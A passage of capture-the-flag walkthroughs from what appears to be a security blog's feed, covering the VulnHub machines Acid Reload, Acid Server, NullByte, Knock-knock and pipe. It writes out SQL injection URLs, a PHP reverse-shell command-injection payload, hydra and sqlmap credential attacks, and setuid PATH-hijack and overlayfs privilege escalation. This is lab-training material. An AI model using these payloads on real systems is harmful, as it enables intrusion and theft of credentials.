<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null)from(information_schema.columns)WHERE'1'='1
</span><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null)from(information_schema.columns)WHERE'1'='1
</span><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null),(null)from(information_schema.columns)WHERE'1'='1</span></code></pre></td></tr></table></div></figure>


<p>when there are two &lsquo;null&rsquo;, no error come back, so the column number is 2.</p>

<p>next check which column holds string value.</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select('test'),(null)from(information_schema.columns)WHERE'1'='1</code></p>

<p>no response</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),('test')from(information_schema.columns)WHERE'1'='1</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>now we know column holds string value</p>

<p>now get the version</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(@@VERSION)from(information_schema.columns)WHERE'1'='1</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>get user,</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(user())from(information_schema.columns)WHERE'1'='1</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get table name</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),GROUP_CONCAT(DISTINCT(table_schema))from(information_schema.tables)WHERE'a'='a</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>got four databases information_schema,mysql,performance_schema,secure_login</p>

<p>get table name</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=-1')union(select(null),GROUP_CONCAT(DISTINCT(table_name))from(information_schema.columns)WHERE(table_schema)=database()and'test'like'test</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p><code>wget http://192.168.41.171:33447/UB3R/strcpy.exe</code></p>

<p>check the file</p>

<p><code>file strcpy.exe</code></p>

<p><code>strcpy.exe: PDF document, version 1.5</code>. a pdf file in it.</p>

<p>use foremost to recover</p>

<p><code>foremost strcpy.exe</code></p>

<p>in folder <code>output</code>,get a folder called rar and there is a rar file, unzip it , get a file called <code>lol.jpg</code></p>

<p>try to use foremost on this file, get another rar, unzip it get a file called <code>Avinash.contact</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="nt">&lt;c:contact</span> <span class="na">c:Version=</span><span class="s">&quot;1&quot;</span> <span class="na">xmlns:c=</span><span class="s">&quot;http://schemas.microsoft.com/Contact&quot;</span> <span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="na">xmlns:MSP2P=</span><span class="s">&quot;http://schemas.microsoft.com/Contact/Extended/MSP2P&quot;</span> <span class="na">xmlns:MSWABMAPI=</span><span class="s">&quot;http://schemas.microsoft.com/Contact/Extended/MSWABMAPI&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;c:CreationDate&gt;</span>2015-08-23T11:39:18Z<span class="nt">&lt;/c:CreationDate&gt;&lt;c:Extended&gt;&lt;MSWABMAPI:PropTag0x3A58101F</span> <span class="na">c:ContentType=</span><span class="s">&quot;binary/x-ms-wab-mapi&quot;</span> <span class="na">c:type=</span><span class="s">&quot;binary&quot;</span><span class="nt">&gt;</span>AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=<span class="nt">&lt;/MSWABMAPI:PropTag0x3A58101F&gt;&lt;/c:Extended&gt;</span>
</span><span class='line'>  <span class="nt">&lt;c:ContactIDCollection&gt;&lt;c:ContactID</span> <span class="na">c:ElementID=</span><span class="s">&quot;599ef753-f77f-4224-8700-e551bdc2bb1e&quot;</span><span class="nt">&gt;&lt;c:Value&gt;</span>0bcf610e-a7be-4f26-9042-d6b3c22c9863<span class="nt">&lt;/c:Value&gt;&lt;/c:ContactID&gt;&lt;/c:ContactIDCollection&gt;&lt;c:EmailAddressCollection&gt;&lt;c:EmailAddress</span> <span class="na">c:ElementID=</span><span class="s">&quot;0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e&quot;</span><span class="nt">&gt;&lt;c:Type&gt;</span>SMTP<span class="nt">&lt;/c:Type&gt;&lt;c:Address&gt;</span>acid.exploit@gmail.com<span class="nt">&lt;/c:Address&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>Preferred<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:EmailAddress&gt;&lt;c:EmailAddress</span> <span class="na">c:ElementID=</span><span class="s">&quot;594eec25-47bd-4290-bd96-a17448f7596a&quot;</span> <span class="na">xsi:nil=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;&lt;/c:EmailAddressCollection&gt;&lt;c:NameCollection&gt;&lt;c:Name</span> <span class="na">c:ElementID=</span><span class="s">&quot;318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2&quot;</span><span class="nt">&gt;&lt;c:FormattedName&gt;</span>Avinash<span class="nt">&lt;/c:FormattedName&gt;&lt;c:GivenName&gt;</span>Avinash<span class="nt">&lt;/c:GivenName&gt;&lt;/c:Name&gt;&lt;/c:NameCollection&gt;&lt;c:PersonCollection&gt;&lt;c:Person</span> <span class="na">c:ElementID=</span><span class="s">&quot;865f9eda-796e-451a-92b1-bf8ee2172134&quot;</span><span class="nt">&gt;&lt;c:FormattedName&gt;</span>Makke<span class="nt">&lt;/c:FormattedName&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>wab:Spouse<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:Person&gt;&lt;/c:PersonCollection&gt;&lt;c:PhotoCollection&gt;&lt;c:Photo</span> <span class="na">c:ElementID=</span><span class="s">&quot;2fb5b981-cec1-45d0-ae61-7c340cfb3d72&quot;</span><span class="nt">&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>UserTile<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:Photo&gt;&lt;/c:PhotoCollection&gt;&lt;/c:contact&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>find a base64 encoded <code>AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</code>, its NooB@123</p>

<p>create a dict file</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'>Avinash
</span><span class='line'>avinash
</span><span class='line'>Makke
</span><span class='line'>makke
</span><span class='line'>acid
</span><span class='line'>acid.exploit
</span><span class='line'>acid.exploit@gmail.com
</span><span class='line'>NooB@123
</span></code></pre></td></tr></table></div></figure>


<p>use hydra to crack</p>

<p><code>hydra -L dict.txt -P dict.txt  192.168.41.171 ssh -s 22</code></p>

<p>get login: makke   password: NooB@123</p>

<p>find <code>.bash_history</code> file</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting file <code>overlayfs</code></p>

<p><code>locate overlayfs</code></p>

<p>in <code>/bin</code></p>

<p><code>ls -alh overlayfs</code></p>

<p><code>-rwxr-xr-x 1 root root 12K Aug 24  2015 overlayfs</code></p>

<p>which is overlayfs local root exploit file</p>

<p>run it
get the root</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Acid Server]]></title>
    <link href="http://wg135.github.io/blog/2016/09/03/acid-server/"/>
    <updated>2016-09-03T12:56:03-05:00</updated>
    <id>http://wg135.github.io/blog/2016/09/03/acid-server</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>DirBuster</li>
<li>Burp</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/37088/">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.170is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.170 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 33447 is open and running http service.</p>

<p>run wfuzz,</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.170:33447/FUZZ 2&gt;/dev/null</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a path <code>Challenge</code></p>

<p>use DirBuster, check <code>http://192.168.41.170:33447/Challenge/</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Check cake.php</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>check source code,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>/Magic_Box</code> may be a hidden path</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>use DirBuster again,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p><code>command.php</code> looks interesting.</p>

<p>check that page:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>type <code>127.0.0.1</code> and use Burp</p>

<p>looks like it pings the IP address I typed</p>

<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_010.png" title="[title manually exploit [alt text]]" &gt;</code></p>

<p>now try <code>127.0.0.1;id</code></p>

<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_011.png" title="[title manually exploit [alt text]]" &gt;</code></p>

<p>works. So there is a command injection vulnerability.</p>

<p>In burp, instead of <code>id</code> command, using (URL encode):</p>

<p><code>php -r '$sock=fsockopen("192.168.41.149",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>

<p>get the shell</p>

<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_012.png" title="[title manually exploit [alt text]]" &gt;</code></p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>after some enumeration</p>

<p><code>cat /etc/*-release</code></p>

<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_013.png" title="[title manually exploit [alt text]]" &gt;</code></p>

<p>Target is running Ubuntu 15.04</p>

<p><code>earchsploit ubuntu | grep 15.04</code></p>

<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_014.png" title="[title manually exploit [alt text]]" &gt;</code></p>

<p>Since the target doesn&rsquo;t have wget and gcc, I setup ftp srever and compile the code locally and upload it.</p>

<p>get root</p>

<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/acid_server/Selection_015.png" title="[title manually exploit [alt text]]" &gt;</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NullByte 1]]></title>
    <link href="http://wg135.github.io/blog/2016/08/30/nullbyte-1/"/>
    <updated>2016-08-30T09:21:46-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/30/nullbyte-1</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Strings</li>
<li>Hydra</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.168 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.168 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>use Nikto to scan</p>

<p><code>nikto -h 192.168.41.168</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find phpMyAdmin directory</p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.168/FUZZ 2&gt;/dev/null</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>check the page:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>just a gif image. Download it and use strings to check</p>

<p><code>strings main.gif</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>P-): kzMb5nVYJw</code>, try <code>192.168.41.168/kzMb5nVYJw</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>check the source:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>use hydra to crack the key:</p>

<p><code>hydra 192.168.41.168 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^&amp;:invalid key" -P /usr/share/wordlists/rockyou.txt -la -t 10 -w 30</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>got key is <code>elite</code></p>

<p>enter the key, now we have another page:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>use sqlmap to get database name:
<code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbs</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>use sqlmap to get tables of database mysql:</p>

<p><code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D mysql --tables</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>get column name of table user</p>

<p><code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D mysql -T user --columns</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>get Username and Password</p>

<p><code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D mysql -T user -C User,Password --dump
</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p><code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D seth --tables</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p><code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D seth -T users --columns</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p><code>sqlmap -u "http://192.168.41.168/kzMb5nVYJw/420search.php?usrtosearch=aaa" -p usrtosearch --dbms mysql -D seth -T users -C user,pass --dump</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>for ramses&rsquo;s password, it looks like md5, google it, go to <a href="http://md5decoder.org/c6d6bd7ebf806f43c76acc3681703b81">md5decoder</a> get <code>omega</code>.</p>

<p>use this to login ssh</p>

<p><code>ssh ramses@192.168.41.168 -p 777</code></p>

<p>get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>try command <code>history</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>find it</p>

<p><code>find / -name "procwatch" 2&gt;/dev/null</code></p>

<p>in <code>/var/www/backup/procwatch</code>, backup, good.</p>

<p>check the file</p>

<p><code>ls -alh /var/www/backup/procwatch</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_024.png" title="[title manually exploit [alt text]]" ></p>

<p>found it’s setuid</p>

<p>run it</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_025.png" title="[title manually exploit [alt text]]" ></p>

<p>find it just run sh and ps</p>

<p>copy /bin/sh to /var/www/backup</p>

<p><code>cp /bin/sh /var/www/backup/ps</code></p>

<p>add it to PATH</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=/var/www/backup:$PATH
</span><span class='line'>echo $PATH</span></code></pre></td></tr></table></div></figure>


<p>run it <code>./procwatch</code> get root</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/nullbyte/Selection_026.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock-knock]]></title>
    <link href="http://wg135.github.io/blog/2016/08/24/knock-knock/"/>
    <updated>2016-08-24T15:37:28-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/24/knock-knock</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Strings</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/knock/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.166 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.166 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>only port 1337 is opening. Based on the nmap&rsquo;s output. I think this is port knocking.</p>

<p>use netcat to check:</p>

<p><code>nc -nv 192.168.41.166 1337</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>get the list, looks like port number. I try to knock them, but failed. Then I realized that i should try all permutations, then I wrote script <a href="https://github.com/wg135/script/blob/master/port_knock_all.py">port_knock_all.py</a>. Run that, then rerun nmap</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto</p>

<p><code>nikto -h 192.168.41.166</code></p>

<p>use wfuzz</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.166/FUZZ 2&gt;/dev/null</code></p>

<p>Nothing cool shows.</p>

<p>check the page</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>nothing useful. Since it is only one image, I will download it and check the string in it</p>

<p><code>strings knockknock.jpg</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like we got <code>abfnW/sax2Cw9Ow</code></p>

<p>try to use this login ssh, failed&hellip;.</p>

<p>Figure out it is <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> and use <a href="http://www.xarg.org/tools/caesar-cipher/">Caesar cipher decryption tool</a></p>

<p>get <code>jason/jB9jP2knf</code></p>

<p>got shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
<code>find / -perm -g=s -o -perm -6000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></p>

<p>got a file <code>/home/jason/tfc</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>run the file</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it need a input file and output file.</p>

<p>tfc will encrypt input and also decrpt input if its encryped. Now generate a large input file.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c "print 'A'*5000" &gt;in.tfc</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>get segmentation fault error.</p>

<p>First, I use <a href="https://github.com/wg135/checksec">checksec.sh</a> to check if there is any protection</p>

<p><code>./checksec.sh  --file tfc</code>
<img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>No protection.</p>

<p>Since gdb is not available on the target, I download tfc to my kali</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>the address is 0x0675c916  not 0x41414141. so it should be encryption of 0x41414141. I was able to figure out how many bytes to pass in to overwrite the return address (4124 bytes).</p>

<p>(To be continue&hellip;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pipe]]></title>
    <link href="http://wg135.github.io/blog/2016/08/23/pipe/"/>
    <updated>2016-08-23T01:31:51-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/23/pipe</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burp</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar arbitrary command execution</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.163 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.163 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>there are 4 ports are opening</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.162</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>shows there is an <code>index.php</code> but needs autherication</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  --hc 401 http://192.168.41.163/FUZZ 2&gt;/dev/null</code></p>

<p>get a path <code>scriptz</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>find a file <code>log.php.BAK</code>, looks like backup file of log.php</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Log</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">public</span> <span class="k">function</span> <span class="nf">PrintLog</span><span class="p">()</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$now</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&gt;data&#39;</span><span class="p">;</span>
</span><span class='line'>        <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">str = </span><span class="se">\&quot;</span><span class="si">$str\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
</span><span class='line'><span class="s2">        echo </span><span class="si">$str</span><span class="s2">;</span>
</span><span class='line'><span class="s2">    }</span>
</span><span class='line'>
</span><span class='line'><span class="s2">    public function __destruct()</span>
</span><span class='line'><span class="s2">    {</span>
</span><span class='line'><span class="s2">        file_put_contents(</span><span class="si">$this-&gt;filename</span><span class="s2">, </span><span class="si">$this-&gt;data</span><span class="s2">, FILE_APPEND);</span>
</span><span class='line'><span class="s2">    }</span>
</span><span class='line'><span class="s2">}</span>
</span><span class='line'><span class="s2">?&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>in order to check if the authentication can be bypassed, I use <code>http method tamper</code>.</p>

<p><code>nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/index.php}' 192.168.41.163</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>It&rsquo;s vulnerable to POST method.</p>

<p>Use Burp to change GET request to /index.php to POST request, and get the page:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>check the source code:</p>

